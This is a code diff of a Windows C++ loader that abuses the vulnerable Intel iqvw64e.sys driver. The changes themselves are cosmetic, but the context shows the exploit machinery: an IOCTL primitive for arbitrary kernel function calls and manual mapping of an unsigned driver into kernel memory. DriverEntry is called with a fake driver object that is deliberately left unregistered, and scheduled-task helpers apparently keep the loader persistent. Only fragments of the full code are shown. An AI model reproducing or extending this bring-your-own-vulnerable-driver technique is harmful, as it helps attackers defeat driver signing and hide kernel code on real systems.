@@ -23,6 +23,7 @@
 //   loader.exe --unload
 //   loader.exe --status
 
+#define NOMINMAX
 #include <windows.h>
 #include <winternl.h>
 #include <cstdio>
@@ -34,7 +35,7 @@
 #include <format>
 #include <algorithm>
 
-// ── ntdll interface ───────────────────────────────────────────────────────────
+// ── ntdll interface ────────────────────────────────────────────────
 
 using fn_NtLoadDriver             = NTSTATUS(NTAPI*)(PUNICODE_STRING);
 using fn_NtUnloadDriver           = NTSTATUS(NTAPI*)(PUNICODE_STRING);
@@ -63,7 +64,7 @@ static bool ResolveNtdll() {
     return true;
 }
 
-// ── privilege ─────────────────────────────────────────────────────────────────
+// ── privilege ─────────────────────────────────────────────────────
 
 static bool AcquireLoadDriverPriv() {
     BOOLEAN prev;
@@ -75,7 +76,7 @@ static bool AcquireLoadDriverPriv() {
     return true;
 }
 
-// ── SCM helpers ───────────────────────────────────────────────────────────────
+// ── SCM helpers ───────────────────────────────────────────────────
 
 static bool ScmLoad(const std::wstring& path, const std::wstring& svc) {
     SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr,
@@ -120,7 +121,7 @@ static bool ScmUnload(const std::wstring& svc) {
     return true;
 }
 
-// ── kernel base ───────────────────────────────────────────────────────────────
+// ── kernel base ──────────────────────────────────────────────────
 
 static PVOID GetKernelBase() {
     ULONG needed = 0;
@@ -138,7 +139,7 @@ static PVOID GetKernelBase() {
     return base;
 }
 
-// ── iqvw64e.sys IOCTL primitive ───────────────────────────────────────────────
+// ── iqvw64e.sys IOCTL primitive ─────────────────────────────────────────────
 //
 // Device: \\.\Iqvw64e  (symlink created by the driver on load)
 // All IOCTLs use METHOD_NEITHER — input/output via Type3InputBuffer.
@@ -271,11 +272,11 @@ static ULONG_PTR KernelCall(ULONG_PTR fn, ULONG_PTR arg1, ULONG_PTR arg2) {
     DWORD br = 0;
     if (!DeviceIoControl(g_Vuln, IOCTL_IQVW_EXEC,
             &e, sizeof(e), &e, sizeof(e), &br, nullptr))
-        return static_cast<ULONG_PTR>(STATUS_UNSUCCESSFUL);
+        return static_cast<ULONG_PTR>(0xC0000001UL); // STATUS_UNSUCCESSFUL
     return static_cast<ULONG_PTR>(e.result);
 }
 
-// ── manual map ────────────────────────────────────────────────────────────────
+// ── manual map ─────────────────────────────────────────────────────────────────
 
 static bool ManualMapDriver(const std::wstring& vulnPath,
                             const std::wstring& driverPath) {
@@ -334,7 +335,7 @@ static bool ManualMapDriver(const std::wstring& vulnPath,
         VulnClose(); return false;
     }
 
-    // build fixed-up image in user space ─────────────────────────────────────
+    // build fixed-up image in user space ───────────────────────────────────
     std::vector<uint8_t> img(imageSize, 0);
 
     // copy headers
@@ -438,7 +439,7 @@ static bool ManualMapDriver(const std::wstring& vulnPath,
     }
     wprintf(L"[+] image written     : 0x%llX\n", kernBase);
 
-    // call DriverEntry(fakeDriverObject, NULL) ────────────────────────────────
+    // call DriverEntry(fakeDriverObject, NULL) ────────────────────────────────────────
     // fakeDriverObject is a zeroed kernel pool block; DriverEntry writes the
     // MajorFunction table and DriverUnload into it, then IoCreateDevice links
     // filter devices to it. The object is intentionally not registered in the
@@ -459,7 +460,7 @@ static bool ManualMapDriver(const std::wstring& vulnPath,
     return true;
 }
 
-// ── scheduled-task install helpers ───────────────────────────────────────────
+// ── scheduled-task install helpers ─────────────────────────────────────────────
 
 // Returns directory of the current executable (no trailing backslash).
 static std::wstring GetLoaderDir() {
@@ -527,7 +528,7 @@ static bool UninstallTask() {
     return false;
 }
 
-// ── main ──────────────────────────────────────────────────────────────────────
+// ── main ─────────────────────────────────────────────────────────────────────────────
 
 static constexpr wchar_t k_SpoSvc[] = L"spo_drv";
 
